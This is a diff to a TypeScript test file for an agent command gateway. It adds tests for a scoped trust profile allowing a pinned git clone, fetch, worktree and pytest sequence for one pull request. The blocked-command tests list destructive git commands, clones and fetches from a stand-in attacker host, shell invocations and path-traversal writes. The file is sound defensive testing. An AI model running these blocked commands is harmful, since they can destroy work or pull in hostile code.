@@ -1,7 +1,7 @@
 import { describe, test, expect } from "bun:test";
 import { readFileSync } from "node:fs";
 process.env.RIAN_TEST_MODE="1";
-const {validateTrustedMailCommand,newTrustedSession,ownedSession,currentSessionState,trustedSessions,trustedDispatch,approvalRequestSeconds,smokeWriteAllowed,projectWriteAllowed,v2MutablePath,v2WriteAllowed}=await import("./gateway.ts");
+const {validateTrustedMailCommand,newTrustedSession,ownedSession,currentSessionState,trustedSessions,trustedDispatch,approvalRequestSeconds,smokeWriteAllowed,projectWriteAllowed,v2MutablePath,v2WriteAllowed,salCommandAllowed,salWriteAllowed}=await import("./gateway.ts");
 const source=readFileSync(new URL("./gateway.ts",import.meta.url),"utf8");
 const cwd="Documents/RIAN-Proton-Tools";
 const valid=(argv:string[],timeout=30)=>validateTrustedMailCommand({argv,cwd,timeout});
@@ -349,5 +349,82 @@ describe("V2 project folder, pinned tests and rollback policies",()=>{
    'passwordOK(f.get("password")',
   ])expect(source).toContain(rule);
   expect(source).toContain('relay("rian_eemf_write_file",{path:args.path,content:args.content,overwrite:args.overwrite},true)');
+ });
+});
+
+describe("Salpion PR16 Git task scoped trust — one approval for fetch/worktree/test",()=>{
+ const profile="dev-salpion-pr16-v1",docs="Documents";
+ const root="Documents/RIAN-Salpion-PR16",worktree=root+"/pr16";
+ const sha="3db3637ab74a74918ffa09c8d034fc8485fe3cfd";
+ const boot=["python","-I","-S","-c","from pathlib import Path;Path('RIAN-Salpion-PR16').mkdir(exist_ok=True);print('RIAN_SALPION_READY')"];
+ const supported=[
+  {id:"bootstrap",cwd:docs,argv:boot},
+  {id:"clone",cwd:root,argv:["git","clone","--no-checkout","--filter=blob:none","https://github.com/youthofdnation/rian-vision-reliability.git","repo"]},
+  {id:"fetch",cwd:root,argv:["git","-C","repo","fetch","--no-tags","origin","refs/pull/16/head:refs/remotes/origin/pr-16"]},
+  {id:"worktree",cwd:root,argv:["git","-C","repo","worktree","add","--detach","../pr16",sha]},
+  {id:"status",cwd:root,argv:["git","-C","pr16","status","--short","--untracked-files=normal"]},
+  {id:"head",cwd:root,argv:["git","-C","pr16","rev-parse","HEAD"]},
+  {id:"diff",cwd:root,argv:["git","-C","pr16","diff","--","tools/its_small_object_eval.py","rian_pr16_notes.md"]},
+  {id:"test",cwd:worktree,argv:["python","-I","-m","pytest","tests/test_its_small_object_eval.py","-q","-p","no:cacheprovider"]}
+ ];
+ test("admits pinned Git workflow and test without a repeated browser approval",()=>{
+  for(const step of supported){
+   expect(salCommandAllowed({cwd:step.cwd,argv:step.argv,timeout:25}).argv).toEqual(step.argv);
+   expect(approvalRequestSeconds("rian_eemf_run_command",{cwd:step.cwd,argv:step.argv,timeout:25})).toBe(1800);
+   expect(validateTrustedMailCommand({cwd:step.cwd,argv:step.argv,timeout:25},profile).argv).toEqual(step.argv);
+  }
+ });
+ test("blocks push, reset, clean, alternate fetch URL, arbitrary Python and shells",()=>{
+  const bad=[["git","push","origin","main"],["git","reset","--hard"],["git","clean","-fd"],
+    ["git","fetch","https://attacker.example/evil"],["git","-C","repo","worktree","remove","../pr16"],
+    ["git","clone","https://attacker.example/evil","repo"],["python","-c","print(1)"],
+    ["powershell","-Command","whoami"],["cmd","/c","dir"],["python","-m","pip","install","pytest"]];
+  for(const argv of bad)expect(()=>salCommandAllowed({cwd:root,argv,timeout:25})).toThrow();
+  expect(approvalRequestSeconds("rian_eemf_run_command",{cwd:root,argv:["git","reset","--hard"],timeout:20})).toBe(300);
+ });
+ test("rejects other workspace, extra fields and excessive timeout",()=>{
+  expect(()=>salCommandAllowed({cwd:"Documents/private",argv:supported[2].argv,timeout:25})).toThrow();
+  expect(()=>salCommandAllowed({cwd:worktree,argv:supported[7].argv,timeout:91})).toThrow();
+  expect(()=>salCommandAllowed({cwd:docs,argv:boot,timeout:20,recursive:true})).toThrow();
+ });
+ test("only pinned source overwrite and notes create/edit are allowed",()=>{
+  const src=worktree+"/tools/its_small_object_eval.py",note=worktree+"/rian_pr16_notes.md";
+  expect(salWriteAllowed({path:src,content:"def f():\n    return 1\n",overwrite:true})).toBe(true);
+  expect(salWriteAllowed({path:note,content:"# PR16 observations\n",overwrite:false})).toBe(true);
+  expect(salWriteAllowed({path:note,content:"# PR16 updated\n",overwrite:true})).toBe(true);
+  const refused=[{path:src,content:"x",overwrite:false},
+    {path:worktree+"/tests/test_its_small_object_eval.py",content:"x",overwrite:true},
+    {path:worktree+"/../other.py",content:"x",overwrite:true},
+    {path:worktree+"/.git/config",content:"x",overwrite:true},
+    {path:src,content:"z".repeat(11501),overwrite:true},
+    {path:src,content:"",overwrite:true},
+    {path:src,content:"x",overwrite:true,force:true}];
+  for(const x of refused)expect(salWriteAllowed(x)).toBe(false);
+ });
+ test("scope is OAuth-client-owned and can be revoked",async()=>{
+  const proposed=JSON.parse(newTrustedSession("rian.salpion-test",profile).content[0].text);
+  expect(proposed.profile).toBe(profile);
+  expect(proposed.state).toBe("PENDING_APPROVAL");
+  expect(()=>ownedSession(proposed.session_id,"rian.other")).toThrow();
+  const detail=JSON.parse((await trustedDispatch("rian_eemf_trusted_session_status",{session_id:proposed.session_id},"rian.salpion-test")).content[0].text);
+  expect(detail.workspace).toBe(worktree);
+  const revoke=JSON.parse((await trustedDispatch("rian_eemf_revoke_trusted_session",{session_id:proposed.session_id},"rian.salpion-test")).content[0].text);
+  expect(revoke.state).toBe("REVOKED");
+ });
+ test("live gateway source gates trust on origin, pinned HEAD, tests, CAS and explicit owner password",()=>{
+  for(const rule of [
+   'const SAL_PROFILE="dev-salpion-pr16-v1"',
+   'const SAL_SHA="3db3637ab74a74918ffa09c8d034fc8485fe3cfd"',
+   'const SAL_TEST_BLOB="37ec260067e28620e6b0ee19d293991676624ae9"',
+   'async function salPreflight(command)',
+   'await salExec(["python","-I","-S","-c",SAL_GUARD]',
+   'text===expected',
+   'if(op.id==="tests")await salExec',
+   'SAL_FILE_GUARD','SAL_NOTE_GUARD',
+   'PR16 stale-source conflict',
+   's.clientId===clientId',
+   'passwordOK(f.get("password")',
+   'if(s.profile===SAL_PROFILE)await salPreflight(safe)',
+  ])expect(source).toContain(rule);
  });
 });
